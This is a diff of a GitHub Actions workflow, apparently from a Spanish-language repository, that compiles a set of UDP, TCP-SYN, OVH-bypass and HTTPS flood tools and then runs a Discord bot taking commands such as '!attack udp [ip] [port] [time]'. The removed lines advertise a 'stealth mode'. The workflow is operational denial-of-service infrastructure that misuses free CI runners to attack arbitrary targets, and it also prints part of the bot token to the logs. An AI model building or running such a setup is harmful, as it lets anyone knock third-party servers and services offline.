@@ -1,127 +1,149 @@
-name: 🚀 Bot UDPs
+name: BOTDDOS Attack
 
 on:
   workflow_dispatch:
   push:
-    branches: [main]
+    branches:
+      - main
 
 jobs:
-  deploy-bot-continuous:
+  build-and-run:
     runs-on: ubuntu-latest
-    
+
     steps:
-    - name: 📥 Usar código actual
-      uses: actions/checkout@v4
-    
-    - name: 🐍 Configurar Python 3.11
-      uses: actions/setup-python@v4
-      with:
-        python-version: '3.11'
-    
-    - name: 🦾 Configurar Go 1.21
-      uses: actions/setup-go@v4
-      with:
-        go-version: '1.21'
-    
-    - name: 🔧 Instalar herramientas de compilación
-      run: |
-        sudo apt-get update
-        sudo apt-get install -y build-essential gcc g++ make libpcap-dev
-    
-    - name: 📦 Instalar discord.py
-      run: |
-        python -m pip install --upgrade pip
-        pip install discord.py
-    
-    - name: 📚 Configurar Go modules
-      run: |
-        if [ ! -f "go.mod" ]; then
-          go mod init bot-udps 2>/dev/null || true
-        fi
-        go get github.com/sandertv/go-raknet 2>/dev/null || true
-    
-    - name: 🛠️ Compilar binarios C
-      run: |
-        echo "=== COMPILANDO BINARIOS ==="
-        
-        # Compilar todos los .c que existan
-        for c_file in *.c; do
-          if [ -f "$c_file" ]; then
-            binary="${c_file%.c}"
-            echo "Compilando $c_file → $binary"
-            gcc -O3 -pthread "$c_file" -o "$binary" 2>/dev/null || echo "  Error con $c_file"
-            
-            if [ -f "$binary" ]; then
-              chmod +x "$binary"
-              echo "  ✓ $binary listo"
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.11'
+
+      - name: Set up Go
+        uses: actions/setup-go@v4
+        with:
+          go-version: '1.21'
+
+      - name: Install Go dependencies
+        run: |
+          go mod init bot 2>/dev/null || true
+          go get github.com/sandertv/go-raknet 2>/dev/null || true
+          go get github.com/sirupsen/logrus 2>/dev/null || true
+
+      - name: Install Python dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install discord.py
+
+      - name: Install build tools
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y build-essential gcc g++ make libpcap-dev libssl-dev wget
+
+      - name: Build binaries
+        run: |
+          echo "=== COMPILANDO BINARIOS ==="
+
+          # Compilar métodos principales
+          binaries=(
+            "udp.c:udp"
+            "udphex.c:udphex"
+            "udppps.c:udppps"
+            "ovh.c:ovh:-lpcap"
+            "udppayload.c:udppayload"
+            "udpbypass.c:udpbypass"
+            "tcp.c:tcp" # Corrected compilation command
+            "httpsrequest.c:httpsrequest"
+            "tcp-syn.c:tcp-syn:-lpthread"  # tcp-syn multi-thread
+          )
+
+          for entry in "${binaries[@]}"; do
+            IFS=':' read -r source binary libs <<< "$entry"
+
+            if [ -f "$source" ]; then
+              echo -n "🔨 $source → $binary ... "
+
+              if [ -n "$libs" ]; then
+                gcc -O3 -pthread "$source" -o "$binary" $libs 2>/dev/null && {
+                  chmod +x "$binary"
+                  echo "✅"
+                } || echo "⚠️"
+              else
+                gcc -O3 "$source" -o "$binary" 2>/dev/null && {
+                  chmod +x "$binary"
+                  echo "✅"
+                } || echo "⚠️"
+              fi
             fi
+          done
+
+          echo ""
+          echo "📂 Ejecutables disponibles:"
+          ls -la | grep -E '^-..x.*' | awk '{print $9}' || echo "No hay ejecutables"
+
+      - name: Prepare environment for https-request
+        run: |
+          echo "=== Preparando entorno para https-request ==="
+          sudo python3 install.py
+
+      - name: 🚀 EJECUTAR BOT CON KEYS
+        env:
+          KEYS: ${{ secrets.KEYS }}  # ¡IMPORTANTE! Esto pasa KEYS al bot.py
+        run: |
+          echo "========================================"
+          echo "🤖 INICIANDO BOT UDP/TCP/AMP/L7"
+          echo "========================================"
+
+          # DEBUG: Verificar que KEYS se recibió
+          echo "🔍 VERIFICANDO CONFIGURACIÓN:"
+          echo "   - Directorio: $(pwd)"
+          echo "   - Archivo bot.py: $(ls -la bot.py 2>/dev/null && echo "✅" || echo "❌")"
+          echo "   - KEYS recibido: $([ -n "$KEYS" ] && echo "✅ (${#KEYS} chars)" || echo "❌ VACÍO")"
+
+          if [ -z "$KEYS" ]; then
+            echo ""
+            echo "❌❌❌ ERROR: KEYS está VACÍO ❌❌❌"
+            echo ""
+            echo "SOLUCIÓN INMEDIATA:"
+            echo "1. El secret 'KEYS' NO está configurado o está vacío"
+            echo "2. Ve a: Settings → Secrets and variables → Actions"
+            echo "3. Haz clic en 'KEYS' para verificar su contenido"
+            echo "4. Si está vacío, edítalo y pega tu token"
+            echo ""
+            echo "Token de Discord debe tener ~59 caracteres como:"
+            echo "pito"
+            exit 1
           fi
-        done
-        
-        echo "Binarios disponibles:"
-        find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" | xargs -I {} basename {} 2>/dev/null || echo "Ninguno"
-    
-    - name: 🔐 Configurar token desde secret KEYS
-      env:
-        DISCORD_TOKEN: ${{ secrets.KEYS }}
-      run: |
-        if [ -z "$DISCORD_TOKEN" ]; then
-          echo "ERROR: Secret 'KEYS' no configurado"
-          echo "Configúralo en: Settings → Secrets → Actions → KEYS"
-          exit 1
-        fi
-        
-        echo "$DISCORD_TOKEN" > token.txt
-        echo "Token guardado en token.txt ($(wc -c < token.txt) caracteres)"
-    
-    - name: 🚀 Ejecutar bot CONTINUAMENTE
-      run: |
-        echo "========================================"
-        echo "INICIANDO BOT EN MODO CONTINUO"
-        echo "========================================"
-        echo "El bot se ejecutará hasta que:"
-        echo "1. GitHub detenga el runner (≈6 horas)"
-        echo "2. Ocurra un error crítico"
-        echo "3. Se cancele manualmente"
-        echo "========================================"
-        echo ""
-        echo "MÉTODOS DISPONIBLES:"
-        echo "!attack udp [ip] [puerto] [tiempo]"
-        echo "!attack udphex [ip] [puerto] [tiempo]"
-        echo "!attack udppps [ip] [puerto] [tiempo]"
-        echo "!attack ovh [ip] [puerto] [tiempo]"
-        echo "!attack raknet [ip] [puerto] [tiempo]"
-        echo "!attack udpflood [ip] [puerto] [tiempo]"
-        echo "!attack udppayload [ip] [puerto] [tiempo] [payload]"
-        echo ""
-        echo "⚠️  MODO SIGILOSO: 0 mensajes en Discord"
-        echo "📝 Logs solo en esta consola"
-        echo "========================================"
-        
-        # Verificar archivos esenciales
-        if [ ! -f "bot.py" ]; then
-          echo "ERROR: bot.py no encontrado"
-          exit 1
-        fi
-        
-        if [ ! -f "token.txt" ] || [ ! -s "token.txt" ]; then
-          echo "ERROR: token.txt no válido"
-          exit 1
-        fi
-        
-        echo ""
-        echo "✅ INICIANDO EJECUCIÓN CONTINUA..."
-        echo "Hora de inicio: $(date)"
-        echo "El bot permanecerá activo hasta que GitHub lo detenga."
-        echo ""
-        
-        # Ejecutar bot INDEFINIDAMENTE (sin timeout)
-        python3 bot.py
-        
-        # Esto solo se ejecutará si el bot se detiene por error
-        echo ""
-        echo "========================================"
-        echo "BOT DETENIDO"
-        echo "Hora de finalización: $(date)"
-        echo "Código de salida: $?"
-        echo "========================================"
+
+          # Verificar formato del token
+          if [ ${#KEYS} -lt 50 ]; then
+            echo "⚠️  ADVERTENCIA: Token muy corto (${#KEYS} chars)"
+            echo "   Debe tener ~59 caracteres mínimo"
+          fi
+
+          echo ""
+          echo "✅ CONFIGURACIÓN CORRECTA"
+          echo "   Token recibido: ${#KEYS} caracteres"
+          echo "   Vista previa: ${KEYS:0:15}..."
+          echo ""
+          echo "🎮 MÉTODOS DISPONIBLES:"
+
+          # Mostrar métodos según ejecutables
+          for method in udp udphex udppps ovh udppayload udpbypass tcp tcp-syn httpsrequest; do
+            [ -f "$method" ] && echo "   • $method"
+          done
+
+          [ -f "udpflood.go" ] && echo "   • udpflood (Go)"
+          [ -f "raknet.go" ] && echo "   • raknet (Go)"
+
+          echo ""
+          echo "🚀 INICIANDO bot.py..."
+          echo "========================================"
+
+          # Ejecutar bot.py (KEYS ya está como variable de entorno)
+          python3 bot.py
+
+          echo ""
+          echo "========================================"
+          echo "🤖 BOT FINALIZADO"
+          echo "========================================"
